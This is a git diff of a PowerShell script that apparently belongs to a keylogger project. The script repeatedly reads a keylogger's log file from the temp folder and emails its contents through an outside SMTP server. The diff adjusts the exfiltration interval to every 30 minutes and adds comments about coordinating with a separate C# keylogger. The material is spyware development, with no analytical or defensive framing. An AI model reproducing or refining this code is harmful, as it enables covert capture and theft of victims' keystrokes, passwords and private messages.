@@ -1,3 +1,5 @@
+### Splitted this script part because launching this script as a background process from the main part of the programm
+# caused race conditions with the C# keylogger
 $variableContainingScriptToBeExecutedAsString = '
 function mail($messageBody){
 		$smtpServer = "smtp.scarlet.be"
@@ -45,7 +47,7 @@ function mail($messageBody){
 	$keyloggerLogFilePath = $env:temp+"\keylogger.txt"
 	while($true)
 	{
-		Sleep (10 * 1)
+		
 		try{
 			if([System.IO.File]::Exists($keyloggerLogFilePath)){
 					$keyloggerFileContents = type $keyloggerLogFilePath
@@ -56,7 +58,10 @@ function mail($messageBody){
 				"Keylogger log does not exist"
 				mail "Keylogger log does not exist"
 				exit
-			}			
+			}		
+		#sleep on the end to send the first result imediately		
+		#30 minutes
+		Sleep (30 * 60)
 		}
 		catch{
 			"Keylogger job is not created"
@@ -88,4 +93,4 @@ function mail($messageBody){
 	$results += "`n"
 	$results
 	while($true)
-	{sleep 1}
+	{Sleep 1}
